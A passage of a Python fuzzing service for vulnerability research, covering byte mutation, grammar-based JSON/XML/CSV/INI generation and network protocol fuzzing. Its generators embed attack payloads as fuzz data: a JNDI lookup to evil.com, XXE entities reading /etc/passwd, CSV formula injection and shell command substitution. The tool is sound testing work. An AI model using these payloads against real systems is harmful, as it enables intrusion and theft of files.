"""
Binary Fuzzer Service

Coverage-guided binary fuzzing for vulnerability research.
Supports native executable fuzzing with crash analysis and behavior monitoring.

Features:
- Input mutation engine (bit flips, arithmetic, dictionary-based)
- Process execution harness with monitoring
- Crash capture and minidump collection
- Crash deduplication and exploitability analysis
- Behavior monitoring (file, registry, network, API calls)
- Memory safety detection
"""

import asyncio
import ctypes
import ctypes.util
import hashlib
import json
import logging
import os
import random
import re
import shutil
import shlex
import signal
import struct
import subprocess
import tempfile
import time
import uuid
from dataclasses import dataclass, field, asdict
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple, AsyncGenerator
import base64
from backend.services.afl_telemetry_service import AflTelemetryRecorder, get_afl_dir_stats
try:
    import resource  # Unix-only
except ImportError:  # pragma: no cover - Windows
    resource = None

logger = logging.getLogger(__name__)


# =============================================================================
# CONFIGURATION & CONSTANTS
# =============================================================================

class MutationStrategy(str, Enum):
    """Mutation strategies for input generation."""
    BIT_FLIP = "bit_flip"
    BYTE_FLIP = "byte_flip"
    ARITHMETIC = "arithmetic"
    INTERESTING_VALUES = "interesting_values"
    DICTIONARY = "dictionary"
    HAVOC = "havoc"  # Random combination of mutations
    SPLICE = "splice"  # Combine two inputs
    TRIM = "trim"  # Minimize input while preserving behavior


class CrashSeverity(str, Enum):
    """Crash severity classification."""
    EXPLOITABLE = "exploitable"
    PROBABLY_EXPLOITABLE = "probably_exploitable"
    PROBABLY_NOT_EXPLOITABLE = "probably_not_exploitable"
    NOT_EXPLOITABLE = "not_exploitable"
    UNKNOWN = "unknown"


class CrashType(str, Enum):
    """Types of crashes detected."""
    ACCESS_VIOLATION_READ = "access_violation_read"
    ACCESS_VIOLATION_WRITE = "access_violation_write"
    ACCESS_VIOLATION_EXECUTE = "access_violation_execute"
    STACK_BUFFER_OVERFLOW = "stack_buffer_overflow"
    HEAP_CORRUPTION = "heap_corruption"
    USE_AFTER_FREE = "use_after_free"
    DOUBLE_FREE = "double_free"
    NULL_POINTER = "null_pointer"
    NULL_DEREF = "null_deref"  # Alias for null pointer dereference
    DIVIDE_BY_ZERO = "divide_by_zero"
    DIVISION_BY_ZERO = "division_by_zero"  # Alias
    INTEGER_OVERFLOW = "integer_overflow"
    STACK_EXHAUSTION = "stack_exhaustion"
    STACK_OVERFLOW = "stack_overflow"  # Alias for stack exhaustion
    ASSERTION_FAILURE = "assertion_failure"
    TIMEOUT = "timeout"
    SEGFAULT = "segfault"
    ABORT = "abort"
    UNKNOWN = "unknown"


class FuzzingMode(str, Enum):
    """Fuzzing operation modes."""
    DUMB = "dumb"  # No coverage feedback
    COVERAGE_GUIDED = "coverage_guided"  # Uses coverage feedback
    GRAMMAR_BASED = "grammar_based"  # Uses input grammar
    HYBRID = "hybrid"  # Combines multiple strategies


class ExecutionMode(str, Enum):
    """Execution harness modes for running targets."""
    AUTO = "auto"
    PROCESS = "process"
    FORKSERVER = "forkserver"
    PERSISTENT = "persistent"


class CoverageBackend(str, Enum):
    """Coverage collection backends."""
    AUTO = "auto"
    AFL_SHM = "afl_shm"
    QEMU = "qemu"  # QEMU TCG coverage for binary-only targets
    NONE = "none"


# Interesting values for arithmetic mutations
INTERESTING_8 = [0, 1, 16, 32, 64, 100, 127, 128, 255]
INTERESTING_16 = [0, 1, 128, 255, 256, 512, 1000, 1024, 4096, 32767, 32768, 65535]
INTERESTING_32 = [
    0, 1, 32768, 65535, 65536, 100000, 0x7FFFFFFF, 0x80000000, 0xFFFFFFFF,
    -1, -100, -10000, -32768, -32769, -65535, -65536
]


# =============================================================================
# INPUT MUTATION ENGINE (1a)
# =============================================================================

class MutationEngine:
    """
    Input mutation engine for fuzzing.
    
    Implements various mutation strategies:
    - Bit/byte flipping
    - Arithmetic mutations
    - Interesting value substitution
    - Dictionary-based mutations
    - Havoc (random combination)
    - Splicing
    - Input trimming/minimization
    """
    
    def __init__(self, dictionary: Optional[List[bytes]] = None):
        self.dictionary = dictionary or []
        self.mutation_count = 0
        self.stats = {
            "bit_flips": 0,
            "byte_flips": 0,
            "arithmetic": 0,
            "interesting": 0,
            "dictionary": 0,
            "havoc": 0,
            "splice": 0,
            "trim": 0,
        }
        
        # Default dictionary with common fuzz values
        self._init_default_dictionary()
    
    def _init_default_dictionary(self):
        """Initialize default fuzzing dictionary."""
        defaults = [
            b"\x00", b"\xff", b"\x00\x00", b"\xff\xff",
            b"\x00\x00\x00\x00", b"\xff\xff\xff\xff",
            b"%s%s%s%s", b"%n%n%n%n", b"%x%x%x%x",
            b"AAAA", b"A" * 100, b"A" * 1000, b"A" * 10000,
            b"../", b"..\\", b"../../../",
            b"'", b'"', b"`", b"\\",
            b"<", b">", b"&", b"|",
            b"\x00\x00\x00\x01", b"\x00\x00\x00\xff",
            b"\x7f\xff\xff\xff", b"\x80\x00\x00\x00",
            b"${", b"{{", b"<%",
            b"\r\n", b"\n", b"\r",
        ]
        self.dictionary.extend(defaults)
    
    def add_to_dictionary(self, data: bytes):
        """Add data to mutation dictionary."""
        if data not in self.dictionary:
            self.dictionary.append(data)
    
    def mutate(
        self, 
        data: bytes, 
        strategy: Optional[MutationStrategy] = None,
        max_mutations: int = 10,
    ) -> bytes:
        """
        Mutate input data using specified or random strategy.
        
        Args:
            data: Input bytes to mutate
            strategy: Mutation strategy (random if None)
            max_mutations: Maximum number of mutations to apply
            
        Returns:
            Mutated bytes
        """
        if not data:
            return self._generate_random_input()
        
        if strategy is None:
            strategy = random.choice(list(MutationStrategy))
        
        self.mutation_count += 1
        
        if strategy == MutationStrategy.BIT_FLIP:
            return self._bit_flip(data)
        elif strategy == MutationStrategy.BYTE_FLIP:
            return self._byte_flip(data)
        elif strategy == MutationStrategy.ARITHMETIC:
            return self._arithmetic_mutation(data)
        elif strategy == MutationStrategy.INTERESTING_VALUES:
            return self._interesting_values(data)
        elif strategy == MutationStrategy.DICTIONARY:
            return self._dictionary_mutation(data)
        elif strategy == MutationStrategy.HAVOC:
            return self._havoc_mutation(data, max_mutations)
        elif strategy == MutationStrategy.SPLICE:
            return self._splice_mutation(data)
        elif strategy == MutationStrategy.TRIM:
            return self._trim_mutation(data)
        else:
            return self._havoc_mutation(data, max_mutations)
    
    def mutate_with_info(
        self,
        data: bytes,
        strategy: Optional[MutationStrategy] = None,
        max_mutations: int = 10,
    ) -> Tuple[bytes, str]:
        """
        Mutate input data and return mutation type info.
        
        Args:
            data: Input bytes to mutate
            strategy: Mutation strategy (random if None)
            max_mutations: Maximum number of mutations to apply
            
        Returns:
            Tuple of (mutated bytes, mutation type string)
        """
        if strategy is None:
            strategy = random.choice(list(MutationStrategy))
        
        mutated = self.mutate(data, strategy, max_mutations)
        return mutated, strategy.value
    
    def _generate_random_input(self, min_size: int = 1, max_size: int = 1024) -> bytes:
        """Generate random input data."""
        size = random.randint(min_size, max_size)
        return bytes(random.randint(0, 255) for _ in range(size))
    
    def _bit_flip(self, data: bytes) -> bytes:
        """Flip random bits in the input."""
        self.stats["bit_flips"] += 1
        data = bytearray(data)
        
        # Flip 1-4 random bits
        num_flips = random.randint(1, min(4, len(data) * 8))
        for _ in range(num_flips):
            byte_idx = random.randint(0, len(data) - 1)
            bit_idx = random.randint(0, 7)
            data[byte_idx] ^= (1 << bit_idx)
        
        return bytes(data)
    
    def _byte_flip(self, data: bytes) -> bytes:
        """Flip random bytes in the input."""
        self.stats["byte_flips"] += 1
        data = bytearray(data)
        
        # Flip 1-4 random bytes
        num_flips = random.randint(1, min(4, len(data)))
        for _ in range(num_flips):
            idx = random.randint(0, len(data) - 1)
            data[idx] ^= 0xFF
        
        return bytes(data)
    
    def _arithmetic_mutation(self, data: bytes) -> bytes:
        """Apply arithmetic operations to random positions."""
        self.stats["arithmetic"] += 1
        data = bytearray(data)
        
        if len(data) < 1:
            return bytes(data)
        
        # Choose byte width
        width = random.choice([1, 2, 4])
        if len(data) < width:
            width = len(data)
        
        pos = random.randint(0, len(data) - width)
        
        # Read value
        if width == 1:
            value = data[pos]
        elif width == 2:
            value = struct.unpack("<H", bytes(data[pos:pos+2]))[0]
        else:
            value = struct.unpack("<I", bytes(data[pos:pos+4]))[0]
        
        # Apply random arithmetic
        operation = random.choice([
            lambda x: x + random.randint(1, 35),
            lambda x: x - random.randint(1, 35),
            lambda x: x * random.randint(2, 8),
            lambda x: x // 2 if x > 0 else x,
            lambda x: -x,
        ])
        
        try:
            new_value = operation(value)
        except:
            new_value = value
        
        # Write back
        if width == 1:
            data[pos] = new_value & 0xFF
        elif width == 2:
            data[pos:pos+2] = struct.pack("<H", new_value & 0xFFFF)
        else:
            data[pos:pos+4] = struct.pack("<I", new_value & 0xFFFFFFFF)
        
        return bytes(data)
    
    def _interesting_values(self, data: bytes) -> bytes:
        """Replace values with interesting boundary values."""
        self.stats["interesting"] += 1
        data = bytearray(data)
        
        if len(data) < 1:
            return bytes(data)
        
        width = random.choice([1, 2, 4])
        if len(data) < width:
            width = len(data)
        
        pos = random.randint(0, len(data) - width)
        
        if width == 1:
            value = random.choice(INTERESTING_8)
            data[pos] = value & 0xFF
        elif width == 2:
            value = random.choice(INTERESTING_16)
            data[pos:pos+2] = struct.pack("<H", value & 0xFFFF)
        else:
            value = random.choice(INTERESTING_32)
            data[pos:pos+4] = struct.pack("<I", value & 0xFFFFFFFF)
        
        return bytes(data)
    
    def _dictionary_mutation(self, data: bytes) -> bytes:
        """Insert or replace with dictionary entries."""
        self.stats["dictionary"] += 1
        
        if not self.dictionary:
            return self._byte_flip(data)
        
        data = bytearray(data)
        entry = random.choice(self.dictionary)
        
        if random.random() < 0.5 and len(data) > 0:
            # Insert at random position
            pos = random.randint(0, len(data))
            data = data[:pos] + bytearray(entry) + data[pos:]
        else:
            # Replace at random position
            if len(data) >= len(entry):
                pos = random.randint(0, len(data) - len(entry))
                data[pos:pos+len(entry)] = entry
            else:
                data = bytearray(entry)
        
        return bytes(data)
    
    def _havoc_mutation(self, data: bytes, max_mutations: int = 10) -> bytes:
        """Apply random combination of mutations (AFL-style havoc)."""
        self.stats["havoc"] += 1
        
        num_mutations = random.randint(1, max_mutations)
        result = data
        
        mutation_funcs = [
            self._bit_flip,
            self._byte_flip,
            self._arithmetic_mutation,
            self._interesting_values,
            self._dictionary_mutation,
            self._delete_bytes,
            self._insert_bytes,
            self._overwrite_bytes,
            self._clone_bytes,
        ]
        
        for _ in range(num_mutations):
            func = random.choice(mutation_funcs)
            try:
                result = func(result)
            except:
                pass
        
        return result
    
    def _delete_bytes(self, data: bytes) -> bytes:
        """Delete random bytes from input."""
        if len(data) <= 1:
            return data
        
        data = bytearray(data)
        num_delete = random.randint(1, min(10, len(data) - 1))
        pos = random.randint(0, len(data) - num_delete)
        del data[pos:pos + num_delete]
        
        return bytes(data)
    
    def _insert_bytes(self, data: bytes) -> bytes:
        """Insert random bytes into input."""
        data = bytearray(data)
        num_insert = random.randint(1, 10)
        pos = random.randint(0, len(data))
        
        new_bytes = bytes(random.randint(0, 255) for _ in range(num_insert))
        data = data[:pos] + bytearray(new_bytes) + data[pos:]
        
        return bytes(data)
    
    def _overwrite_bytes(self, data: bytes) -> bytes:
        """Overwrite random bytes in input."""
        if len(data) < 1:
            return data
        
        data = bytearray(data)
        num_overwrite = random.randint(1, min(10, len(data)))
        pos = random.randint(0, len(data) - num_overwrite)
        
        for i in range(num_overwrite):
            data[pos + i] = random.randint(0, 255)
        
        return bytes(data)
    
    def _clone_bytes(self, data: bytes) -> bytes:
        """Clone a chunk of bytes to another position."""
        if len(data) < 2:
            return data
        
        data = bytearray(data)
        chunk_size = random.randint(1, min(20, len(data)))
        src_pos = random.randint(0, len(data) - chunk_size)
        dst_pos = random.randint(0, len(data))
        
        chunk = data[src_pos:src_pos + chunk_size]
        data = data[:dst_pos] + chunk + data[dst_pos:]
        
        return bytes(data)
    
    def _splice_mutation(self, data: bytes, other: Optional[bytes] = None) -> bytes:
        """Splice two inputs together."""
        self.stats["splice"] += 1
        
        if other is None:
            # Generate second input if not provided
            other = self._generate_random_input(len(data) // 2, len(data) * 2)
        
        if len(data) < 2 or len(other) < 2:
            return data
        
        # Random splice points
        split1 = random.randint(1, len(data) - 1)
        split2 = random.randint(1, len(other) - 1)
        
        return data[:split1] + other[split2:]
    
    def _trim_mutation(self, data: bytes) -> bytes:
        """Trim input to smaller size."""
        self.stats["trim"] += 1
        
        if len(data) <= 4:
            return data
        
        # Remove random percentage
        keep_ratio = random.uniform(0.5, 0.9)
        new_size = max(1, int(len(data) * keep_ratio))
        
        if random.random() < 0.5:
            # Keep from beginning
            return data[:new_size]
        else:
            # Keep from end
            return data[-new_size:]
    
    def get_stats(self) -> Dict[str, Any]:
        """Get mutation statistics."""
        return {
            "total_mutations": self.mutation_count,
            "strategy_counts": self.stats.copy(),
            "dictionary_size": len(self.dictionary),
        }


# =============================================================================
# STRUCTURED INPUT FUZZING (Medium Priority - Phase 6)
# =============================================================================

class InputFormat(str, Enum):
    """Supported structured input formats."""
    JSON = "json"
    XML = "xml"
    PROTOBUF = "protobuf"
    CSV = "csv"
    INI = "ini"
    CUSTOM_GRAMMAR = "custom_grammar"


@dataclass
class GrammarRule:
    """A single grammar rule for structured fuzzing."""
    name: str
    productions: List[str]  # List of possible productions
    weight: float = 1.0  # Selection weight


class StructuredInputGenerator:
    """
    Grammar-based input generator for structured formats.
    
    Generates valid-looking inputs that exercise parser edge cases.
    """
    
    # Common JSON mutations
    JSON_MUTATIONS = [
        ('null', ['null', 'NULL', 'Null', 'nil', 'None', '']),
        ('true', ['true', 'TRUE', 'True', '1', 'yes']),
        ('false', ['false', 'FALSE', 'False', '0', 'no']),
        ('number', ['0', '-0', '1e999', '-1e999', 'NaN', 'Infinity', '-Infinity', 
                   '9999999999999999999999999999', '0.0000000000000001', '1e-999']),
        ('string', ['', '\\u0000', '\\x00', '\\"', '\\\\', '\n\r\t', 
                   'A' * 10000, '${jndi:ldap://evil.com}', '<script>alert(1)</script>']),
    ]
    
    # Common XML mutations
    XML_MUTATIONS = [
        ('entity', ['&lt;', '&gt;', '&amp;', '&quot;', '&apos;',
                   '&#x0;', '&#0;', '&xxe;', '<!ENTITY xxe SYSTEM "file:///etc/passwd">']),
        ('cdata', ['<![CDATA[]]>', '<![CDATA[<script>]]>', '<![CDATA[' + 'A' * 10000 + ']]>']),
        ('comment', ['<!---->', '<!-- -- -->', '<!--' + '-' * 10000 + '-->']),
        ('pi', ['<?xml?>', '<?xml version="1.0"?>', '<?evil system("id")?>']),
    ]
    
    def __init__(self, format_type: InputFormat, grammar: Optional[Dict[str, GrammarRule]] = None):
        self.format_type = format_type
        self.grammar = grammar or {}
        self.max_depth = 10
        self.generated_count = 0
        
    def generate(self, seed: Optional[bytes] = None, mutate_existing: bool = False) -> bytes:
        """Generate a structured input."""
        self.generated_count += 1
        
        if mutate_existing and seed:
            return self._mutate_structured(seed)
        
        if self.format_type == InputFormat.JSON:
            return self._generate_json()
        elif self.format_type == InputFormat.XML:
            return self._generate_xml()
        elif self.format_type == InputFormat.CSV:
            return self._generate_csv()
        elif self.format_type == InputFormat.INI:
            return self._generate_ini()
        elif self.format_type == InputFormat.CUSTOM_GRAMMAR:
            return self._generate_from_grammar()
        else:
            return seed or b'{}'
    
    def _generate_json(self, depth: int = 0) -> bytes:
        """Generate a JSON document with fuzzing elements."""
        if depth > self.max_depth:
            return b'null'
        
        obj_type = random.choice(['object', 'array', 'primitive'])
        
        if obj_type == 'object':
            num_keys = random.randint(0, 5)
            pairs = []
            for i in range(num_keys):
                key = self._generate_json_string()
                value = self._generate_json_value(depth + 1)
                pairs.append(f'{key}: {value}')
            return ('{' + ', '.join(pairs) + '}').encode()
        
        elif obj_type == 'array':
            num_items = random.randint(0, 5)
            items = [self._generate_json_value(depth + 1) for _ in range(num_items)]
            return ('[' + ', '.join(items) + ']').encode()
        
        else:
            return self._generate_json_value(depth).encode()
    
    def _generate_json_value(self, depth: int = 0) -> str:
        """Generate a JSON value with potential edge cases."""
        if depth > self.max_depth:
            return 'null'
        
        value_type = random.choice(['string', 'number', 'bool', 'null', 'object', 'array'])
        
        if value_type == 'string':
            return self._generate_json_string()
        elif value_type == 'number':
            mutations = [m[1] for m in self.JSON_MUTATIONS if m[0] == 'number'][0]
            return random.choice(mutations + [str(random.randint(-1000000, 1000000))])
        elif value_type == 'bool':
            mutations = [m[1] for m in self.JSON_MUTATIONS if m[0] in ('true', 'false')]
            return random.choice([item for sublist in mutations for item in sublist])
        elif value_type == 'null':
            mutations = [m[1] for m in self.JSON_MUTATIONS if m[0] == 'null'][0]
            return random.choice(mutations)
        elif value_type == 'object' and depth < self.max_depth:
            return self._generate_json(depth + 1).decode()
        elif value_type == 'array' and depth < self.max_depth:
            num_items = random.randint(0, 3)
            items = [self._generate_json_value(depth + 1) for _ in range(num_items)]
            return '[' + ', '.join(items) + ']'
        else:
            return 'null'
    
    def _generate_json_string(self) -> str:
        """Generate a JSON string with potential edge cases."""
        if random.random() < 0.3:
            mutations = [m[1] for m in self.JSON_MUTATIONS if m[0] == 'string'][0]
            content = random.choice(mutations)
        else:
            length = random.randint(0, 100)
            content = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789_-') for _ in range(length))
        return f'"{content}"'
    
    def _generate_xml(self, depth: int = 0) -> bytes:
        """Generate an XML document with fuzzing elements."""
        lines = ['<?xml version="1.0" encoding="UTF-8"?>']
        
        # Potentially add XXE payload
        if random.random() < 0.2:
            lines.append('<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>')
        
        lines.append(self._generate_xml_element('root', depth))
        return '\n'.join(lines).encode()
    
    def _generate_xml_element(self, tag: str, depth: int = 0) -> str:
        """Generate an XML element."""
        if depth > self.max_depth:
            return f'<{tag}/>'
        
        # Generate attributes
        attrs = []
        num_attrs = random.randint(0, 3)
        for i in range(num_attrs):
            attr_name = f'attr{i}'
            attr_value = self._generate_xml_content()
            attrs.append(f'{attr_name}="{attr_value}"')
        
        attr_str = ' ' + ' '.join(attrs) if attrs else ''
        
        # Generate content
        content_type = random.choice(['empty', 'text', 'children', 'mixed'])
        
        if content_type == 'empty':
            return f'<{tag}{attr_str}/>'
        elif content_type == 'text':
            text = self._generate_xml_content()
            return f'<{tag}{attr_str}>{text}</{tag}>'
        elif content_type == 'children':
            children = []
            num_children = random.randint(1, 3)
            for i in range(num_children):
                child_tag = f'child{i}'
                children.append(self._generate_xml_element(child_tag, depth + 1))
            return f'<{tag}{attr_str}>\n{"".join(children)}\n</{tag}>'
        else:
            text = self._generate_xml_content()
            child = self._generate_xml_element('nested', depth + 1)
            return f'<{tag}{attr_str}>{text}{child}</{tag}>'
    
    def _generate_xml_content(self) -> str:
        """Generate XML content with potential edge cases."""
        if random.random() < 0.3:
            mutations = random.choice(self.XML_MUTATIONS)[1]
            return random.choice(mutations)
        else:
            length = random.randint(0, 50)
            return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789 ') for _ in range(length))
    
    def _generate_csv(self) -> bytes:
        """Generate a CSV document with fuzzing elements."""
        lines = []
        num_cols = random.randint(1, 10)
        num_rows = random.randint(1, 20)
        
        # Header
        headers = [f'col{i}' for i in range(num_cols)]
        lines.append(','.join(headers))
        
        # Data rows
        for _ in range(num_rows):
            row = []
            for _ in range(num_cols):
                cell = self._generate_csv_cell()
                row.append(cell)
            lines.append(','.join(row))
        
        return '\n'.join(lines).encode()
    
    def _generate_csv_cell(self) -> str:
        """Generate a CSV cell with potential edge cases."""
        cell_type = random.choice(['normal', 'quoted', 'formula', 'special'])
        
        if cell_type == 'normal':
            return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(random.randint(0, 20)))
        elif cell_type == 'quoted':
            content = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz,"\n') for _ in range(random.randint(0, 30)))
            return f'"{content}"'
        elif cell_type == 'formula':
            # CSV injection payloads
            formulas = ['=CMD|"/C calc"!A0', '=1+1', '@SUM(1+1)', '+1+1', '-1+1', 
                       '=HYPERLINK("http://evil.com")', '|ls', '`id`']
            return random.choice(formulas)
        else:
            specials = ['\x00', '\r\n', '\\', '\t', '', ',' * 10, '"' * 10]
            return random.choice(specials)
    
    def _generate_ini(self) -> bytes:
        """Generate an INI document with fuzzing elements."""
        lines = []
        num_sections = random.randint(1, 5)
        
        for i in range(num_sections):
            section_name = f'section{i}'
            if random.random() < 0.2:
                # Malformed section names
                section_name = random.choice(['', ']bad[', 'a' * 1000, '\x00section', 'sec;tion'])
            
            lines.append(f'[{section_name}]')
            
            num_keys = random.randint(0, 5)
            for j in range(num_keys):
                key = f'key{j}'
                value = self._generate_ini_value()
                lines.append(f'{key}={value}')
            
            lines.append('')  # Blank line between sections
        
        return '\n'.join(lines).encode()
    
    def _generate_ini_value(self) -> str:
        """Generate an INI value with potential edge cases."""
        if random.random() < 0.3:
            specials = ['', '\x00', '\\n', '\\r', '=', ';comment', '#comment',
                       'value ; inline comment', '"quoted value"', "'single quoted'",
                       '${env:PATH}', '%PATH%', '$(whoami)', '`id`']
            return random.choice(specials)
        else:
            return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(random.randint(0, 50)))
    
    def _generate_from_grammar(self, start_symbol: str = 'start') -> bytes:
        """Generate input from custom grammar."""
        if not self.grammar:
            return b''
        
        if start_symbol not in self.grammar:
            start_symbol = list(self.grammar.keys())[0] if self.grammar else 'start'
        
        return self._expand_symbol(start_symbol, depth=0).encode()
    
    def _expand_symbol(self, symbol: str, depth: int) -> str:
        """Expand a grammar symbol."""
        if depth > self.max_depth:
            return ''
        
        if symbol not in self.grammar:
            return symbol  # Terminal
        
        rule = self.grammar[symbol]
        production = random.choice(rule.productions)
        
        # Expand non-terminals in production
        result = []
        for token in production.split():
            if token.startswith('<') and token.endswith('>'):
                # Non-terminal
                inner_symbol = token[1:-1]
                result.append(self._expand_symbol(inner_symbol, depth + 1))
            else:
                result.append(token)
        
        return ' '.join(result)
    
    def _mutate_structured(self, data: bytes) -> bytes:
        """Mutate an existing structured input while preserving structure."""
        try:
            if self.format_type == InputFormat.JSON:
                return self._mutate_json(data)
            elif self.format_type == InputFormat.XML:
                return self._mutate_xml(data)
            else:
                # Fall back to random mutation
                return self._random_mutate(data)
        except:
            return self._random_mutate(data)
    
    def _mutate_json(self, data: bytes) -> bytes:
        """Mutate a JSON document while maintaining structure."""
        try:
            obj = json.loads(data.decode())
            mutated = self._mutate_json_value(obj)
            return json.dumps(mutated, ensure_ascii=False).encode()
        except:
            return data
    
    def _mutate_json_value(self, value: Any, depth: int = 0) -> Any:
        """Recursively mutate a JSON value."""
        if depth > 10:
            return value
        
        if isinstance(value, dict):
            result = {}
            for k, v in value.items():
                # Possibly mutate key
                new_key = k if random.random() > 0.1 else self._generate_json_string().strip('"')
                result[new_key] = self._mutate_json_value(v, depth + 1)
            
            # Possibly add new key
            if random.random() < 0.2:
                result[f'injected_{random.randint(0, 999)}'] = self._generate_json_value(depth)
            
            return result
        
        elif isinstance(value, list):
            result = [self._mutate_json_value(item, depth + 1) for item in value]
            
            # Possibly add/remove items
            if random.random() < 0.2 and result:
                result.pop(random.randint(0, len(result) - 1))
            if random.random() < 0.2:
                result.append(self._generate_json_value(depth))
            
            return result
        
        elif isinstance(value, str):
            if random.random() < 0.3:
                mutations = [m[1] for m in self.JSON_MUTATIONS if m[0] == 'string'][0]
                return random.choice(mutations)
            return value
        
        elif isinstance(value, (int, float)):
            if random.random() < 0.3:
                return random.choice([0, -1, 2**31, 2**63, float('inf'), float('-inf')])
            return value
        
        else:
            return value
    
    def _mutate_xml(self, data: bytes) -> bytes:
        """Mutate an XML document."""
        text = data.decode('utf-8', errors='ignore')
        
        mutations = [
            # Add XXE
            lambda t: t.replace('<?xml', '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<?xml'),
            # Inject entity
            lambda t: t.replace('>', '>&xxe;<', 1),
            # Add CDATA
            lambda t: t.replace('>', '><![CDATA[INJECTED]]><', 1),
            # Duplicate tags
            lambda t: t + t[-100:] if len(t) > 100 else t + t,
            # Add deeply nested elements
            lambda t: t.replace('</', '<nested>' * 100 + '</', 1).replace('</nested>', '</nested>' * 100, 1),
        ]
        
        mutation = random.choice(mutations)
        try:
            return mutation(text).encode()
        except:
            return data
    
    def _random_mutate(self, data: bytes) -> bytes:
        """Fall back to random byte mutation."""
        if not data:
            return data
        
        data = bytearray(data)
        num_mutations = random.randint(1, 5)
        
        for _ in range(num_mutations):
            pos = random.randint(0, len(data) - 1)
            data[pos] = random.randint(0, 255)
        
        return bytes(data)


# =============================================================================
# NETWORK PROTOCOL FUZZING (Medium Priority - Phase 6)
# =============================================================================

@dataclass
class NetworkTarget:
    """Network fuzzing target configuration."""
    host: str
    port: int
    protocol: str = "tcp"  # tcp or udp
    ssl: bool = False
    timeout_seconds: float = 5.0


@dataclass
class NetworkFuzzResult:
    """Result of a network fuzzing attempt."""
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    target: str = ""
    request_data: bytes = b""
    response_data: bytes = b""
    duration_ms: float = 0.0
    error: Optional[str] = None
    connection_reset: bool = False
    connection_refused: bool = False
    timeout: bool = False
    interesting: bool = False  # Different response than expected


class NetworkProtocolFuzzer:
    """
    Fuzz network protocols over TCP/UDP.
    
    Supports:
    - Raw socket fuzzing
    - SSL/TLS connections
    - Request/response analysis
    - Crash detection via connection behavior
    """
    
    def __init__(self, target: NetworkTarget):
        self.target = target
        self.stats = {
            "requests_sent": 0,
            "responses_received": 0,
            "connection_resets": 0,
            "timeouts": 0,
            "errors": 0,
            "interesting_responses": 0,
        }
        self.baseline_responses: List[bytes] = []
        self.interesting_inputs: List[Tuple[bytes, bytes]] = []  # (request, response)
    
    async def fuzz(
        self,
        seed_data: bytes,
        mutation_engine: MutationEngine,
        num_iterations: int = 1000,
    ) -> AsyncGenerator[NetworkFuzzResult, None]:
        """
        Fuzz the network target.
        
        Args:
            seed_data: Initial request data
            mutation_engine: Mutation engine to use
            num_iterations: Number of fuzzing iterations
            
        Yields:
            NetworkFuzzResult for each iteration
        """
        import socket
        
        # Establish baseline
        await self._establish_baseline(seed_data)
        
        for i in range(num_iterations):
            # Mutate request
            mutated = mutation_engine.mutate(seed_data)
            
            result = await self._send_request(mutated)
            result.id = f"net_{i}"
            
            self.stats["requests_sent"] += 1
            
            if result.error:
                self.stats["errors"] += 1
            if result.connection_reset:
                self.stats["connection_resets"] += 1
            if result.timeout:
                self.stats["timeouts"] += 1
            if result.response_data:
                self.stats["responses_received"] += 1
            
            # Check if response is interesting
            result.interesting = self._is_interesting_response(result)
            if result.interesting:
                self.stats["interesting_responses"] += 1
                self.interesting_inputs.append((mutated, result.response_data))
            
            yield result
    
    async def _establish_baseline(self, seed_data: bytes, num_samples: int = 3):
        """Establish baseline responses for comparison."""
        for _ in range(num_samples):
            result = await self._send_request(seed_data)
            if result.response_data:
                self.baseline_responses.append(result.response_data)
    
    async def _send_request(self, data: bytes) -> NetworkFuzzResult:
        """Send a request to the target."""
        import socket
        
        result = NetworkFuzzResult(
            target=f"{self.target.host}:{self.target.port}",
            request_data=data,
        )
        
        start_time = time.time()
        
        try:
            if self.target.protocol == "tcp":
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            sock.settimeout(self.target.timeout_seconds)
            
            if self.target.ssl and self.target.protocol == "tcp":
                import ssl
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock)
            
            if self.target.protocol == "tcp":
                sock.connect((self.target.host, self.target.port))
            
            # Send data
            if self.target.protocol == "tcp":
                sock.sendall(data)
            else:
                sock.sendto(data, (self.target.host, self.target.port))
            
            # Receive response
            try:
                response = sock.recv(65536)
                result.response_data = response
            except socket.timeout:
                result.timeout = True
            except ConnectionResetError:
                result.connection_reset = True
            
            sock.close()
            
        except ConnectionRefusedError:
            result.connection_refused = True
            result.error = "Connection refused"
        except ConnectionResetError:
            result.connection_reset = True
            result.error = "Connection reset"
        except socket.timeout:
            result.timeout = True
            result.error = "Connection timeout"
        except Exception as e:
            result.error = str(e)
        
        result.duration_ms = (time.time() - start_time) * 1000
        return result
    
    def _is_interesting_response(self, result: NetworkFuzzResult) -> bool:
        """Check if response is different from baseline."""
        if result.connection_reset and not any(
            r == b'' for r in self.baseline_responses
        ):
            return True  # Crash indicator
        
        if result.response_data:
            # Check for error messages
            response_lower = result.response_data.lower()
            error_indicators = [
                b'error', b'exception', b'fault', b'crash', b'segfault',
                b'stack trace', b'core dump', b'assertion failed',
            ]
            for indicator in error_indicators:
                if indicator in response_lower:
                    return True
            
            # Check if significantly different from baseline
            for baseline in self.baseline_responses:
                if len(result.response_data) != len(baseline):
                    ratio = len(result.response_data) / max(1, len(baseline))
                    if ratio < 0.5 or ratio > 2.0:
                        return True
        
        return False
    
    def get_stats(self) -> Dict[str, Any]:
        """Get fuzzing statistics."""
        return {
            **self.stats,
            "interesting_inputs_count": len(self.interesting_inputs),
            "target": f"{self.target.host}:{self.target.port}",
        }


# =============================================================================
# DIFFERENTIAL FUZZING (Medium Priority - Phase 6)
# =============================================================================

@dataclass
class DifferentialTarget:
    """A target for differential fuzzing."""
    name: str
    path: str
    args: str = "@@"
    env: Dict[str, str] = field(default_factory=dict)


@dataclass
class DifferentialResult:
    """Result of differential fuzzing."""
    input_data: bytes
    results: Dict[str, "ExecutionResult"]  # target_name -> result (forward ref)
    is_divergent: bool = False
    divergence_type: Optional[str] = None  # exit_code, output, crash, timeout
    
    def to_dict(self) -> Dict[str, Any]:
        return {
